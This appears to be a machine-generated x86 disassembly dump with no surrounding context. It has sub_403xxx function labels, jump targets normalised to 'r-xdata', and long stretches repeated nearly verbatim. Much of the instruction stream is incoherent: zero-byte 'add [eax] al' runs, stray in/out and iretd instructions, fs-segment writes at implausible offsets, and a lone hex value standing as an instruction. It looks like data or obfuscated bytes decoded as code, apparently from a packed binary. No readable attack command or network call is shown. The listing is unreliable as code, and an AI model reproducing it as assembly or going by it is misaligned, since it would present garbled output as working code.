add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
jae r-xdata
jmp 0xffffffffff79b18e
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4030d4
pop eax
jne r-xdata
jne r-xdata
sub edi 0xfeb2810f
pop eax
jge r-xdata
jge 0xffffffffffa2b380
pop ecx
jns r-xdata
jno 0xffffffff874f6633
jg r-xdata
jo 0xffffffffcbc1af95
ja r-xdata
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jge r-xdata
call [ 0xffffffffca81677d ]
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ee5b
jne r-xdata
or edx 0xf3812e79
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16eba
jge 0x71fc6fd3
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
add [ ecx + 0x42850fe2 ] 0xffffffff
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jae r-xdata
ja 0xffffffffa3c34090
jae r-xdata
ja 0xffffffff89a46d31
ja r-xdata
xor ebx 0xff3d870f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
pop edx
pop edx
jae r-xdata
jmp 0xffffffffff79b18e
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jg r-xdata
add eax 0x5abb2979
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4030f7
add esp 0x4
jae r-xdata
push ecx
push ebx
push ecx
call sub_4031f4
xor ebx 0xff1a830f
jo 0x5596885a
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34090
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bb34d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb676
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_40325c
jb 0xffffffff81b2af12
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
add esp 0x4
jae r-xdata
jl 0xf3b428
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f8b21
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
jno r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428ab9d
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b682
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
add [ eax ] al
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffd03a4
jno r-xdata
jge 0xffffffffffa0b6e3
jge r-xdata
jpe 0x74cd42e7
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403102
push esp
push edi
push esi
push ebp
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34090
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bb34d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb676
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_40325c
jb 0xffffffff81b2af12
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
add esp 0x4
jae r-xdata
jl 0xf3b428
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f8b21
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
jno r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428ab9d
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b682
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
add [ eax ] al
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffd03a4
jno r-xdata
jge 0xffffffffffa0b6e3
jge r-xdata
jpe 0x74cd42e7
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4031e5
jg r-xdata
jne r-xdata
and eax 0xae830f
add [ eax ] al
jae r-xdata
and esi 0x89641273
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
